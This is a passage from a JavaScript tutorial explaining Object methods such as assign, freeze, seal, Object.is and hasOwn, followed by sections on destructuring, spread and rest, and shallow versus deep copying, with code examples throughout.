const defaults = { a: 1, b: 2 };
const overrides = { b: 3, c: 4 };

const result = Object.assign({}, defaults, overrides);

console.log(result);  // { a: 1, b: 3, c: 4 }
// b: 3 from overrides (not b: 2 from defaults)
```

---

#### Returns Target

```javascript
const target = { a: 1 };
const result = Object.assign(target, { b: 2 });

console.log(result === target);  // true (same object)
```

---

#### With Getters/Setters

**Converts accessors to data properties:**

```javascript
const source = {
  get value() {
    return 42;
  }
};

const copy = Object.assign({}, source);

console.log(Object.getOwnPropertyDescriptor(copy, "value"));
// { value: 42, writable: true, enumerable: true, configurable: true }
// Getter became data property!

// To preserve: use Object.defineProperties
const properCopy = Object.defineProperties(
  {},
  Object.getOwnPropertyDescriptors(source)
);

console.log(Object.getOwnPropertyDescriptor(properCopy, "value"));
// { get: [Function: get value], set: undefined, ... }
```

---

#### Practical Patterns

**Cloning:**

```javascript
const original = { a: 1, b: 2 };
const clone = Object.assign({}, original);
```

**Merging:**

```javascript
const merged = Object.assign({}, obj1, obj2, obj3);
```

**Adding properties:**

```javascript
const enhanced = Object.assign({}, original, {
  newProp: "value"
});
```

**Immutable update:**

```javascript
const state = { count: 0, user: "Alice" };

// Don't mutate original
const newState = Object.assign({}, state, { count: 1 });

console.log(state.count);     // 0 (unchanged)
console.log(newState.count);  // 1
```

---

### 4.3.3 Immutability Controls

### `Object.freeze()`

**Make object immutable (cannot add, delete, or modify properties):**

```javascript
const obj = {
  name: "Alice",
  age: 30
};

Object.freeze(obj);

// Cannot modify
obj.name = "Bob";
console.log(obj.name);  // "Alice" (unchanged)

// Cannot add
obj.email = "alice@example.com";
console.log(obj.email);  // undefined

// Cannot delete
delete obj.age;
console.log(obj.age);  // 30 (still there)

// Strict mode throws errors
"use strict";
obj.name = "Bob";  // TypeError
```

---

#### Shallow Freeze

**Only freezes top level:**

```javascript
const obj = {
  name: "Alice",
  address: {
    city: "NYC"
  }
};

Object.freeze(obj);

obj.name = "Bob";  // Fails
console.log(obj.name);  // "Alice"

obj.address.city = "LA";  // Works! (nested object not frozen)
console.log(obj.address.city);  // "LA"
```

---

#### Deep Freeze

**Recursively freeze nested objects:**

```javascript
function deepFreeze(obj) {
  // Freeze object itself
  Object.freeze(obj);
  
  // Freeze all properties
  Object.getOwnPropertyNames(obj).forEach(prop => {
    const value = obj[prop];
    
    if (value && typeof value === "object") {
      deepFreeze(value);
    }
  });
  
  return obj;
}

const obj = {
  name: "Alice",
  address: {
    city: "NYC",
    coords: {
      lat: 40.7128,
      lng: -74.0060
    }
  }
};

deepFreeze(obj);

obj.address.coords.lat = 0;  // Fails
console.log(obj.address.coords.lat);  // 40.7128 (unchanged)
```

---

#### Effects on Property Descriptors

```javascript
const obj = { a: 1 };
Object.freeze(obj);

Object.defineProperty(obj, "a", {
  value: 2  // TypeError: Cannot redefine property
});

Object.defineProperty(obj, "b", {
  value: 2  // TypeError: Cannot add property
});
```

---

### `Object.seal()`

**Prevent adding or deleting properties (but can modify existing):**

```javascript
const obj = {
  name: "Alice",
  age: 30
};

Object.seal(obj);

// Can modify
obj.name = "Bob";
console.log(obj.name);  // "Bob" (changed)

// Cannot add
obj.email = "alice@example.com";
console.log(obj.email);  // undefined

// Cannot delete
delete obj.age;
console.log(obj.age);  // 30 (still there)
```

---

#### Effects on Descriptors

```javascript
const obj = { a: 1 };

Object.seal(obj);

// Can change value
obj.a = 2;
console.log(obj.a);  // 2

// Can change writable
Object.defineProperty(obj, "a", {
  writable: false
});

// Cannot add properties
Object.defineProperty(obj, "b", {
  value: 2  // TypeError
});

// Cannot delete properties
delete obj.a;  // Fails
```

---

### `Object.preventExtensions()`

**Prevent adding new properties (but can modify and delete existing):**

```javascript
const obj = {
  name: "Alice",
  age: 30
};

Object.preventExtensions(obj);

// Can modify
obj.name = "Bob";
console.log(obj.name);  // "Bob"

// Can delete
delete obj.age;
console.log(obj.age);  // undefined

// Cannot add
obj.email = "alice@example.com";
console.log(obj.email);  // undefined
```

---

### Comparison Table

|Operation|Normal|preventExtensions|seal|freeze|
|---|---|---|---|---|
|Add property|âœ“|âœ—|âœ—|âœ—|
|Delete property|âœ“|âœ“|âœ—|âœ—|
|Modify value|âœ“|âœ“|âœ“|âœ—|
|Modify descriptor|âœ“|âœ“|Limited*|âœ—|

*`seal`: Can change `writable` from `true` to `false`

---

### `Object.isFrozen()`

**Check if object is frozen:**

```javascript
const obj = { a: 1 };

console.log(Object.isFrozen(obj));  // false

Object.freeze(obj);

console.log(Object.isFrozen(obj));  // true
```

---

#### Empty Object

```javascript
const obj = {};

console.log(Object.isFrozen(obj));  // false

Object.preventExtensions(obj);

console.log(Object.isFrozen(obj));  // true (empty + non-extensible = frozen)
```

---

### `Object.isSealed()`

**Check if object is sealed:**

```javascript
const obj = { a: 1 };

console.log(Object.isSealed(obj));  // false

Object.seal(obj);

console.log(Object.isSealed(obj));  // true
```

---

#### Frozen is Also Sealed

```javascript
const obj = { a: 1 };

Object.freeze(obj);

console.log(Object.isSealed(obj));  // true
console.log(Object.isFrozen(obj));  // true

// Frozen âŠ† Sealed âŠ† Non-extensible
```

---

### `Object.isExtensible()`

**Check if properties can be added:**

```javascript
const obj = { a: 1 };

console.log(Object.isExtensible(obj));  // true

Object.preventExtensions(obj);

console.log(Object.isExtensible(obj));  // false
```

---

#### All Immutability Checks

```javascript
const obj = { a: 1 };

Object.freeze(obj);

console.log(Object.isExtensible(obj));  // false
console.log(Object.isSealed(obj));      // true
console.log(Object.isFrozen(obj));      // true
```

---

### 4.3.4 Prototype Methods

### `Object.getPrototypeOf()`

**Get object's prototype:**

```javascript
const proto = { inherited: "value" };
const obj = Object.create(proto);

console.log(Object.getPrototypeOf(obj) === proto);  // true
```

---

#### Built-in Prototypes

```javascript
console.log(Object.getPrototypeOf([]) === Array.prototype);  // true
console.log(Object.getPrototypeOf({}) === Object.prototype); // true

function F() {}
const instance = new F();
console.log(Object.getPrototypeOf(instance) === F.prototype);  // true
```

---

#### `null` Prototype

```javascript
const obj = Object.create(null);

console.log(Object.getPrototypeOf(obj));  // null
```

---

#### Prefer Over `__proto__`

```javascript
// Old way (deprecated)
const proto = obj.__proto__;

// Modern way (recommended)
const proto = Object.getPrototypeOf(obj);
```

---

### `Object.setPrototypeOf()`

**Set object's prototype:**

```javascript
const proto = { inherited: "value" };
const obj = { own: "property" };

Object.setPrototypeOf(obj, proto);

console.log(obj.inherited);  // "value" (from proto)
console.log(obj.own);        // "property" (own)
```

---

#### Performance Warning

**Very slow! Avoid in performance-critical code:**

```javascript
// Slow (changes prototype)
const obj = { a: 1 };
Object.setPrototypeOf(obj, somePrototype);

// Fast (sets prototype at creation)
const obj = Object.create(somePrototype, {
  a: { value: 1 }
});
```

---

#### Replace Prototype

```javascript
const oldProto = { old: "value" };
const newProto = { new: "value" };

const obj = Object.create(oldProto);

console.log(obj.old);  // "value"
console.log(obj.new);  // undefined

Object.setPrototypeOf(obj, newProto);

console.log(obj.old);  // undefined
console.log(obj.new);  // "value"
```

---

#### Set to `null`

```javascript
const obj = { a: 1 };

Object.setPrototypeOf(obj, null);

console.log(obj.toString);  // undefined (no inherited methods)
```

---

### 4.3.5 Comparison

### `Object.is()`

**Same-value equality:**

```javascript
Object.is(value1, value2)
```

---

#### vs `===`

**Differences:**

1. **`NaN` equals `NaN`:**

```javascript
console.log(NaN === NaN);     // false
console.log(Object.is(NaN, NaN));  // true
```

2. **`+0` and `-0` are different:**

```javascript
console.log(0 === -0);        // true
console.log(Object.is(0, -0));     // false
console.log(Object.is(-0, -0));    // true
```

---

#### Otherwise Same as `===`

```javascript
console.log(Object.is(42, 42));    // true
console.log(Object.is(42, "42"));  // false
console.log(Object.is(null, undefined));  // false

const obj = {};
console.log(Object.is(obj, obj));  // true
console.log(Object.is({}, {}));    // false
```

---

#### Use Cases

**Checking for `NaN`:**

```javascript
function isNaN(value) {
  return Object.is(value, NaN);
}

console.log(isNaN(NaN));  // true
console.log(isNaN(5));    // false

// Or use Number.isNaN
console.log(Number.isNaN(NaN));  // true
```

**Distinguishing `+0` and `-0`:**

```javascript
function isNegativeZero(value) {
  return Object.is(value, -0);
}

console.log(isNegativeZero(0));   // false
console.log(isNegativeZero(-0));  // true
```

---

#### Polyfill

```javascript
if (!Object.is) {
  Object.is = function(x, y) {
    // SameValue algorithm
    if (x === y) {
      // Handle +0 vs -0
      return x !== 0 || 1 / x === 1 / y;
    } else {
      // Handle NaN
      return x !== x && y !== y;
    }
  };
}
```

---

### 4.3.6 Property Existence

### `Object.hasOwn()` (ES2022)

**Check if object has own property:**

```javascript
const obj = { a: 1 };

console.log(Object.hasOwn(obj, "a"));  // true
console.log(Object.hasOwn(obj, "b"));  // false
```

---

#### Vs `hasOwnProperty()`

**Safer than `hasOwnProperty()`:**

```javascript
// Problem: hasOwnProperty can be shadowed
const obj = {
  a: 1,
  hasOwnProperty: function() {
    return false;  // Shadowed!
  }
};

console.log(obj.hasOwnProperty("a"));  // false (wrong!)

// Object.hasOwn is safe
console.log(Object.hasOwn(obj, "a"));  // true (correct)
```

---

#### With `null` Prototype

```javascript
const obj = Object.create(null);
obj.a = 1;

// Error: no hasOwnProperty method
// obj.hasOwnProperty("a");  // TypeError

// Object.hasOwn works
console.log(Object.hasOwn(obj, "a"));  // true
```

---

#### Vs `in` Operator

```javascript
const proto = { inherited: "value" };
const obj = Object.create(proto);
obj.own = "property";

// in: checks own and inherited
console.log("own" in obj);       // true
console.log("inherited" in obj); // true

// Object.hasOwn: checks only own
console.log(Object.hasOwn(obj, "own"));       // true
console.log(Object.hasOwn(obj, "inherited")); // false
```

---

#### Checking Before Access

```javascript
const config = { timeout: 5000 };

if (Object.hasOwn(config, "timeout")) {
  console.log(`Timeout: ${config.timeout}ms`);
}
```

---

#### Polyfill for Older Environments

```javascript
if (!Object.hasOwn) {
  Object.hasOwn = function(obj, prop) {
    return Object.prototype.hasOwnProperty.call(obj, prop);
  };
}
```

---

### 4.3.7 Additional Methods

### `Object.getOwnPropertyNames()`

**Get all own property names (including non-enumerable):**

```javascript
const obj = { visible: 1 };

Object.defineProperty(obj, "hidden", {
  value: 2,
  enumerable: false
});

console.log(Object.keys(obj));  // ["visible"]

console.log(Object.getOwnPropertyNames(obj));
// ["visible", "hidden"] (includes non-enumerable)
```

---

### `Object.getOwnPropertySymbols()`

**Get all own symbol properties:**

```javascript
const sym = Symbol("id");

const obj = {
  name: "Alice",
  [sym]: 123
};

console.log(Object.keys(obj));  // ["name"] (no symbols)

console.log(Object.getOwnPropertySymbols(obj));
// [Symbol(id)]
```

---

### All Own Properties

**Combine strings and symbols:**

```javascript
const sym = Symbol("id");

const obj = {
  name: "Alice",
  [sym]: 123
};

Object.defineProperty(obj, "hidden", {
  value: "secret",
  enumerable: false
});

const allProps = [
  ...Object.getOwnPropertyNames(obj),
  ...Object.getOwnPropertySymbols(obj)
];

console.log(allProps);
// ["name", "hidden", Symbol(id)]

// Or use Reflect.ownKeys
console.log(Reflect.ownKeys(obj));
// ["name", "hidden", Symbol(id)]
```

---

### 4.3.8 Practical Patterns

### Cloning Objects

**Shallow clone:**

```javascript
// Method 1: Object.assign
const clone1 = Object.assign({}, original);

// Method 2: Spread
const clone2 = { ...original };

// Method 3: Preserve descriptors
const clone3 = Object.defineProperties(
  {},
  Object.getOwnPropertyDescriptors(original)
);
```

**Deep clone:**

```javascript
// Simple objects only (no functions, dates, etc.)
const deepClone = JSON.parse(JSON.stringify(original));

// Full deep clone (structured clone in modern browsers)
const deepClone = structuredClone(original);

// Manual recursive
function deepClone(obj) {
  if (obj === null || typeof obj !== "object") {
    return obj;
  }
  
  if (obj instanceof Date) {
    return new Date(obj);
  }
  
  if (obj instanceof Array) {
    return obj.map(item => deepClone(item));
  }
  
  const cloned = {};
  for (let key in obj) {
    if (Object.hasOwn(obj, key)) {
      cloned[key] = deepClone(obj[key]);
    }
  }
  
  return cloned;
}
```

---

### Merging Objects

**Shallow merge:**

```javascript
const defaults = { a: 1, b: 2, c: 3 };
const options = { b: 20, d: 4 };

const merged = { ...defaults, ...options };
// { a: 1, b: 20, c: 3, d: 4 }

// Or
const merged = Object.assign({}, defaults, options);
```

**Deep merge:**

```javascript
function deepMerge(target, source) {
  for (let key in source) {
    if (Object.hasOwn(source, key)) {
      if (source[key] && typeof source[key] === "object") {
        target[key] = target[key] || {};
        deepMerge(target[key], source[key]);
      } else {
        target[key] = source[key];
      }
    }
  }
  return target;
}

const obj1 = { a: 1, nested: { x: 1, y: 2 } };
const obj2 = { b: 2, nested: { y: 20, z: 3 } };

const merged = deepMerge({}, obj1);
deepMerge(merged, obj2);

console.log(merged);
// { a: 1, b: 2, nested: { x: 1, y: 20, z: 3 } }
```

---

### Object Comparison

```javascript
function shallowEqual(obj1, obj2) {
  const keys1 = Object.keys(obj1);
  const keys2 = Object.keys(obj2);
  
  if (keys1.length !== keys2.length) {
    return false;
  }
  
  for (let key of keys1) {
    if (!Object.is(obj1[key], obj2[key])) {
      return false;
    }
  }
  
  return true;
}

console.log(shallowEqual({ a: 1, b: 2 }, { a: 1, b: 2 }));  // true
console.log(shallowEqual({ a: 1, b: 2 }, { a: 1, b: 3 }));  // false
```

---

### Pick Properties

```javascript
function pick(obj, keys) {
  return keys.reduce((result, key) => {
    if (Object.hasOwn(obj, key)) {
      result[key] = obj[key];
    }
    return result;
  }, {});
}

const user = { name: "Alice", age: 30, email: "alice@example.com" };
const subset = pick(user, ["name", "email"]);

console.log(subset);  // { name: "Alice", email: "alice@example.com" }
```

---

### Omit Properties

```javascript
function omit(obj, keys) {
  return Object.fromEntries(
    Object.entries(obj).filter(([key]) => !keys.includes(key))
  );
}

const user = { name: "Alice", age: 30, password: "secret" };
const safe = omit(user, ["password"]);

console.log(safe);  // { name: "Alice", age: 30 }
```

---

### Map Object Values

```javascript
function mapValues(obj, fn) {
  return Object.fromEntries(
    Object.entries(obj).map(([key, value]) => [key, fn(value, key)])
  );
}

const prices = { apple: 1.5, banana: 0.75, orange: 2.0 };
const doubled = mapValues(prices, price => price * 2);

console.log(doubled);
// { apple: 3, banana: 1.5, orange: 4 }
```

---

## Summary

### Enumeration

- **`Object.keys()`**: Array of own enumerable property names
- **`Object.values()`**: Array of own enumerable property values
- **`Object.entries()`**: Array of [key, value] pairs
- **`Object.fromEntries()`**: Create object from entries

### Copying

- **`Object.assign()`**: Copy properties (shallow, converts getters)
- Spread syntax: `{ ...obj }` (shallow)
- `structuredClone()`: Deep clone (modern browsers)

### Immutability

- **`Object.freeze()`**: Cannot add, delete, or modify (shallow)
- **`Object.seal()`**: Cannot add or delete (can modify)
- **`Object.preventExtensions()`**: Cannot add (can modify and delete)
- **`Object.isFrozen()`**: Check if frozen
- **`Object.isSealed()`**: Check if sealed
- **`Object.isExtensible()`**: Check if extensible

### Prototypes

- **`Object.getPrototypeOf()`**: Get prototype
- **`Object.setPrototypeOf()`**: Set prototype (slow!)
- **`Object.create()`**: Create with specific prototype

### Comparison

- **`Object.is()`**: Same-value equality (handles NaN and Â±0)
- **`Object.hasOwn()`**: Check own property (ES2022, safe)

### Property Inspection

- **`Object.getOwnPropertyNames()`**: All own properties (including non-enumerable)
- **`Object.getOwnPropertySymbols()`**: All own symbol properties
- **`Reflect.ownKeys()`**: All own properties (strings + symbols)

### Key Patterns

- Clone: shallow (assign/spread), deep (structuredClone/recursive)
- Merge: shallow (spread), deep (recursive)
- Transform: map values, pick/omit properties
- Compare: shallow equality check
- Immutability: freeze (deep freeze for nested)

---

## 4.4 Destructuring

### Why Destructuring Changes How You Write JavaScript

Destructuring is a JavaScript expression that allows you to extract values from arrays or properties from objects into distinct variables. It's not just syntactic sugarâ€”it fundamentally improves code clarity:

```javascript
// âŒ Before: Verbose and repetitive
function processUser(user) {
  const name = user.name;
  const email = user.email;
  const role = user.role;
  // ...
}

// âœ… After: Clean and declarative
function processUser({ name, email, role }) {
  // Variables ready to use immediately
}
```

**Destructuring shines in:**
- **Function parameters** â€” Extract just what you need, with defaults
- **API responses** â€” Pull out nested data cleanly
- **React/Vue** â€” Props and state management
- **Import statements** â€” `import { useState } from 'react'`

### Object Destructuring

Object destructuring extracts properties from objects and assigns them to variables.

**Basic Syntax:**

```javascript
const person = {
  name: 'Alice',
  age: 30,
  city: 'New York'
};

// Traditional approach
const name = person.name;
const age = person.age;

// Destructuring approach
const { name, age, city } = person;

console.log(name); // 'Alice'
console.log(age);  // 30
console.log(city); // 'New York'
```

**Extracting Specific Properties:**

```javascript
const user = {
  username: 'john_doe',
  email: 'john@example.com',
  password: 'secret123',
  role: 'admin'
};

// Extract only what you need
const { username, email } = user;

console.log(username); // 'john_doe'
console.log(email);    // 'john@example.com'
// password and role are not extracted
```

### Nested Destructuring

Destructuring can be used with nested objects to extract deeply nested values.

**Single-Level Nesting:**

```javascript
const student = {
  name: 'Emma',
  grades: {
    math: 95,
    science: 88,
    english: 92
  }
};

// Destructure nested object
const { name, grades: { math, science } } = student;

console.log(name);    // 'Emma'
console.log(math);    // 95
console.log(science); // 88
// Note: 'grades' is not assigned as a variable
```

**Multi-Level Nesting:**

```javascript
const company = {
  name: 'Tech Corp',
  location: {
    country: 'USA',
    address: {
      street: '123 Main St',
      city: 'San Francisco',
      zip: '94102'
    }
  }
};

// Deep nested destructuring
const {
  location: {
    country,
    address: { city, zip }
  }
} = company;

console.log(country); // 'USA'
console.log(city);    // 'San Francisco'
console.log(zip);     // '94102'
```

**Complex Nested Structures:**

```javascript
const data = {
  user: {
    profile: {
      personal: {
        firstName: 'John',
        lastName: 'Smith'
      },
      contact: {
        email: 'john.smith@email.com',
        phone: '555-0123'
      }
    },
    settings: {
      theme: 'dark',
      notifications: true
    }
  }
};

// Extract deeply nested values
const {
  user: {
    profile: {
      personal: { firstName, lastName },
      contact: { email }
    },
    settings: { theme }
  }
} = data;

console.log(firstName); // 'John'
console.log(lastName);  // 'Smith'
console.log(email);     // 'john.smith@email.com'
console.log(theme);     // 'dark'
```

### Default Values

Default values can be assigned to variables in case the property doesn't exist in the object.

**Basic Default Values:**

```javascript
const config = {
  host: 'localhost',
  port: 3000
};

// Assign default values
const { host, port, protocol = 'http' } = config;

console.log(host);     // 'localhost'
console.log(port);     // 3000
console.log(protocol); // 'http' (default value used)
```

**Default Values with Nested Objects:**

```javascript
const options = {
  timeout: 5000
};

// Default values for nested properties
const {
  timeout,
  retry = {
    attempts: 3,
    delay: 1000
  }
} = options;

console.log(timeout);        // 5000
console.log(retry.attempts); // 3 (default object used)
console.log(retry.delay);    // 1000
```

**Handling `undefined` vs Missing Properties:**

```javascript
const obj = {
  a: undefined,
  b: null,
  c: 0,
  d: ''
};

const { a = 'default-a', b = 'default-b', c = 'default-c', d = 'default-d', e = 'default-e' } = obj;

console.log(a); // 'default-a' (undefined triggers default)
console.log(b); // null (null doesn't trigger default)
console.log(c); // 0 (0 doesn't trigger default)
console.log(d); // '' (empty string doesn't trigger default)
console.log(e); // 'default-e' (missing property triggers default)
```

### Rest in Destructuring

The rest operator (`...`) collects remaining properties into a new object.

**Basic Rest Pattern:**

```javascript
const person = {
  name: 'Bob',
  age: 25,
  city: 'Boston',
  country: 'USA',
  occupation: 'Engineer'
};

// Extract some properties, collect the rest
const { name, age, ...otherInfo } = person;

console.log(name);      // 'Bob'
console.log(age);       // 25
console.log(otherInfo); // { city: 'Boston', country: 'USA', occupation: 'Engineer' }
```

**Rest with Nested Destructuring:**

```javascript
const product = {
  id: 101,
  name: 'Laptop',
  specs: {
    cpu: 'Intel i7',
    ram: '16GB',
    storage: '512GB SSD',
    display: '15.6 inch',
    weight: '1.8kg'
  },
  price: 1299
};

// Combine nested destructuring with rest
const {
  id,
  specs: { cpu, ram, ...otherSpecs },
  ...productRest
} = product;

console.log(id);         // 101
console.log(cpu);        // 'Intel i7'
console.log(ram);        // '16GB'
console.log(otherSpecs); // { storage: '512GB SSD', display: '15.6 inch', weight: '1.8kg' }
console.log(productRest);// { name: 'Laptop', price: 1299 }
```

**Practical Use Cases:**

```javascript
// Extracting API response data
function processUserData(userData) {
  const { id, username, ...settings } = userData;
  
  console.log(`User ${username} (ID: ${id})`);
  console.log('Settings:', settings);
}

processUserData({
  id: 42,
  username: 'alice',
  theme: 'dark',
  language: 'en',
  notifications: true
});
// User alice (ID: 42)
// Settings: { theme: 'dark', language: 'en', notifications: true }

// Removing sensitive data
function sanitizeUser(user) {
  const { password, ssn, creditCard, ...safeData } = user;
  return safeData;
}

const rawUser = {
  name: 'John',
  email: 'john@example.com',
  password: 'secret123',
  ssn: '123-45-6789',
  age: 30
};

console.log(sanitizeUser(rawUser));
// { name: 'John', email: 'john@example.com', age: 30 }
```

### Renaming During Destructuring

You can assign properties to variables with different names using the colon (`:`) syntax.

**Basic Renaming:**

```javascript
const user = {
  name: 'Alice',
  age: 28,
  email: 'alice@example.com'
};

// Rename variables during destructuring
const { name: userName, age: userAge, email: userEmail } = user;

console.log(userName);  // 'Alice'
console.log(userAge);   // 28
console.log(userEmail); // 'alice@example.com'
// Note: 'name', 'age', 'email' are NOT defined
```

**Renaming with Default Values:**

```javascript
const settings = {
  theme: 'light',
  language: 'en'
};

// Combine renaming and default values
const {
  theme: selectedTheme = 'dark',
  language: lang = 'en',
  fontSize: size = 14
} = settings;

console.log(selectedTheme); // 'light'
console.log(lang);          // 'en'
console.log(size);          // 14 (default used)
```

**Renaming in Nested Destructuring:**

```javascript
const response = {
  status: 200,
  data: {
    user: {
      id: 1,
      info: {
        firstName: 'John',
        lastName: 'Doe'
      }
    }
  }
};

// Rename nested properties
const {
  status: httpStatus,
  data: {
    user: {
      id: userId,
      info: { firstName: first, lastName: last }
    }
  }
} = response;

console.log(httpStatus); // 200
console.log(userId);     // 1
console.log(first);      // 'John'
console.log(last);       // 'Doe'
```

**Practical Example - Avoiding Naming Conflicts:**

```javascript
// When fetching data from multiple sources
const localUser = { name: 'LocalUser', id: 1 };
const remoteUser = { name: 'RemoteUser', id: 2 };

const { name: localName, id: localId } = localUser;
const { name: remoteName, id: remoteId } = remoteUser;

console.log(localName, localId);   // 'LocalUser' 1
console.log(remoteName, remoteId); // 'RemoteUser' 2
```

**Function Parameters with Destructuring:**

```javascript
// Rename and provide defaults in function parameters
function createUser({ 
  name: userName, 
  email: userEmail, 
  role: userRole = 'guest' 
}) {
  return {
    userName,
    userEmail,
    userRole,
    createdAt: new Date()
  };
}

const newUser = createUser({ 
  name: 'Bob', 
  email: 'bob@example.com' 
});

console.log(newUser);
// {
//   userName: 'Bob',
//   userEmail: 'bob@example.com',
//   userRole: 'guest',
//   createdAt: [current date]
// }
```

---

## 4.5 Spread and Rest

The spread (`...`) and rest (`...`) operators use the same syntax but serve opposite purposes. Spread expands elements, while rest collects them.

### Spread Operator with Objects

The spread operator unpacks object properties into a new object or combines multiple objects.

**Basic Object Spreading:**

```javascript
const person = {
  name: 'Alice',
  age: 30
};

// Create a copy
const personCopy = { ...person };

console.log(personCopy); // { name: 'Alice', age: 30 }
console.log(personCopy === person); // false (different objects)
```

**Combining Objects:**

```javascript
const basicInfo = {
  name: 'Bob',
  age: 25
};

const contactInfo = {
  email: 'bob@example.com',
  phone: '555-0123'
};

// Merge objects
const completeProfile = { ...basicInfo, ...contactInfo };

console.log(completeProfile);
// {
//   name: 'Bob',
//   age: 25,
//   email: 'bob@example.com',
//   phone: '555-0123'
// }
```

**Overriding Properties:**

```javascript
const defaults = {
  theme: 'light',
  fontSize: 14,
  language: 'en'
};

const userPreferences = {
  theme: 'dark',
  fontSize: 16
};

// Later properties override earlier ones
const finalSettings = { ...defaults, ...userPreferences };

console.log(finalSettings);
// { theme: 'dark', fontSize: 16, language: 'en' }

// Order matters!
const reversedSettings = { ...userPreferences, ...defaults };
console.log(reversedSettings);
// { theme: 'light', fontSize: 14, language: 'en' }
```

**Adding or Modifying Properties:**

```javascript
const user = {
  id: 1,
  name: 'Charlie',
  email: 'charlie@example.com'
};

// Add new properties
const userWithTimestamp = {
  ...user,
  createdAt: new Date(),
  isActive: true
};

console.log(userWithTimestamp);
// {
//   id: 1,
//   name: 'Charlie',
//   email: 'charlie@example.com',
//   createdAt: [current date],
//   isActive: true
// }

// Modify existing property
const updatedUser = {
  ...user,
  name: 'Charles' // Override name
};

console.log(updatedUser);
// { id: 1, name: 'Charles', email: 'charlie@example.com' }
```

**Conditional Spreading:**

```javascript
const baseConfig = {
  host: 'localhost',
  port: 3000
};

const isProduction = false;

const config = {
  ...baseConfig,
  ...(isProduction && {
    host: 'example.com',
    ssl: true
  })
};

console.log(config);
// { host: 'localhost', port: 3000 }
// (production settings not added because isProduction is false)
```

**Nested Object Spreading:**

```javascript
const user = {
  name: 'Diana',
  address: {
    street: '123 Main St',
    city: 'Boston'
  }
};

// CAREFUL: This is a shallow copy
const userCopy = { ...user };

userCopy.address.city = 'New York';

console.log(user.address.city);     // 'New York' (original modified!)
console.log(userCopy.address.city); // 'New York'

// To properly copy nested objects, use deep spreading
const properCopy = {
  ...user,
  address: { ...user.address }
};

properCopy.address.city = 'Seattle';

console.log(user.address.city);       // 'New York' (unchanged)
console.log(properCopy.address.city); // 'Seattle'
```

### Rest Properties

The rest operator collects remaining properties into a new object. It's the opposite of spread.

**Basic Rest in Objects:**

```javascript
const person = {
  firstName: 'John',
  lastName: 'Doe',
  age: 30,
  city: 'New York',
  country: 'USA'
};

// Destructure some properties, collect the rest
const { firstName, lastName, ...details } = person;

console.log(firstName); // 'John'
console.log(lastName);  // 'Doe'
console.log(details);   // { age: 30, city: 'New York', country: 'USA' }
```

**Rest in Function Parameters:**

```javascript
// Collect all properties except specific ones
function updateUser(userId, { name, email, ...otherUpdates }) {
  console.log(`Updating user ${userId}`);
  console.log('Name:', name);
  console.log('Email:', email);
  console.log('Other updates:', otherUpdates);
}

updateUser(123, {
  name: 'Alice',
  email: 'alice@example.com',
  age: 28,
  city: 'Boston',
  preferences: { theme: 'dark' }
});
// Updating user 123
// Name: Alice
// Email: alice@example.com
// Other updates: { age: 28, city: 'Boston', preferences: { theme: 'dark' } }
```

**Filtering Object Properties:**

```javascript
// Remove unwanted properties
function removePrivateFields(obj) {
  const { password, ssn, creditCard, ...publicData } = obj;
  return publicData;
}

const user = {
  name: 'Bob',
  email: 'bob@example.com',
  password: 'secret',
  ssn: '123-45-6789',
  age: 35
};

const safeUser = removePrivateFields(user);
console.log(safeUser); // { name: 'Bob', email: 'bob@example.com', age: 35 }
```

**Combining Spread and Rest:**

```javascript
const original = {
  id: 1,
  name: 'Product',
  price: 99.99,
  category: 'Electronics',
  stock: 50
};

// Extract some fields, modify others, keep the rest
function transformProduct(product) {
  const { id, name, ...rest } = product;
  
  return {
    productId: id,
    productName: name.toUpperCase(),
    ...rest,
    lastModified: new Date()
  };
}

console.log(transformProduct(original));
// {
//   productId: 1,
//   productName: 'PRODUCT',
//   price: 99.99,
//   category: 'Electronics',
//   stock: 50,
//   lastModified: [current date]
// }
```

### Shallow vs Deep Copying

Understanding the difference between shallow and deep copying is crucial when working with objects.

**Shallow Copy Behavior:**

```javascript
const original = {
  name: 'Alice',
  age: 30,
  hobbies: ['reading', 'gaming'],
  address: {
    city: 'New York',
    country: 'USA'
  }
};

// Shallow copy using spread
const shallowCopy = { ...original };

// Modify primitive value (safe)
shallowCopy.name = 'Bob';
console.log(original.name); // 'Alice' (unchanged)
console.log(shallowCopy.name); // 'Bob'

// Modify nested object (NOT safe)
shallowCopy.address.city = 'Boston';
console.log(original.address.city); // 'Boston' (changed!)
console.log(shallowCopy.address.city); // 'Boston'

// Modify array (NOT safe)
shallowCopy.hobbies.push('cooking');
console.log(original.hobbies); // ['reading', 'gaming', 'cooking'] (changed!)
```

**Why Shallow Copy Shares References:**

```javascript
const obj = {
  primitive: 42,
  reference: { nested: 'value' }
};

const copy = { ...obj };

console.log(obj.reference === copy.reference); // true (same reference!)
console.log(obj.primitive === copy.primitive); // true (but this is safe because it's a primitive)
```

**Manual Deep Copy:**

```javascript
const original = {
  name: 'Charlie',
  scores: [85, 90, 78],
  details: {
    age: 25,
    address: {
      city: 'Seattle',
      zip: '98101'
    }
  }
};

// Manual deep copy (one level at a time)
const deepCopy = {
  ...original,
  scores: [...original.scores],
  details: {
    ...original.details,
    address: { ...original.details.address }
  }
};

// Now modifications are safe
deepCopy.scores.push(95);
deepCopy.details.address.city = 'Portland';

console.log(original.scores); // [85, 90, 78] (unchanged)
console.log(original.details.address.city); // 'Seattle' (unchanged)
console.log(deepCopy.scores); // [85, 90, 78, 95]
console.log(deepCopy.details.address.city); // 'Portland'
```

**Using `JSON` for Deep Copy:**

```javascript
const original = {
  name: 'Diana',
  age: 28,
  hobbies: ['painting', 'yoga'],
  address: {
    city: 'Austin',
    state: 'TX'
  }
};

// Quick deep copy using JSON (with limitations)
const deepCopy = JSON.parse(JSON.stringify(original));

deepCopy.address.city = 'Dallas';
deepCopy.hobbies.push('reading');

console.log(original.address.city); // 'Austin' (unchanged)
console.log(original.hobbies); // ['painting', 'yoga'] (unchanged)
console.log(deepCopy.address.city); // 'Dallas'
console.log(deepCopy.hobbies); // ['painting', 'yoga', 'reading']
```

**Limitations of JSON Deep Copy:**

```javascript
const complex = {
  date: new Date(),
  regex: /test/i,
  func: function() { return 'hello'; },
  undef: undefined,
  symbol: Symbol('sym'),
  nan: NaN,
  infinity: Infinity
};

const copied = JSON.parse(JSON.stringify(complex));

console.log(copied);
// {
//   date: '2024-01-15T10:30:00.000Z' (converted to string!)
//   regex: {} (converted to empty object!)
//   // func: missing (functions are not copied!)
//   // undef: missing (undefined is not copied!)
//   // symbol: missing (symbols are not copied!)
//   nan: null (NaN becomes null!)
//   infinity: null (Infinity becomes null!)
// }
```

**Best Practices:**

```javascript
// For simple objects with primitives only: use spread
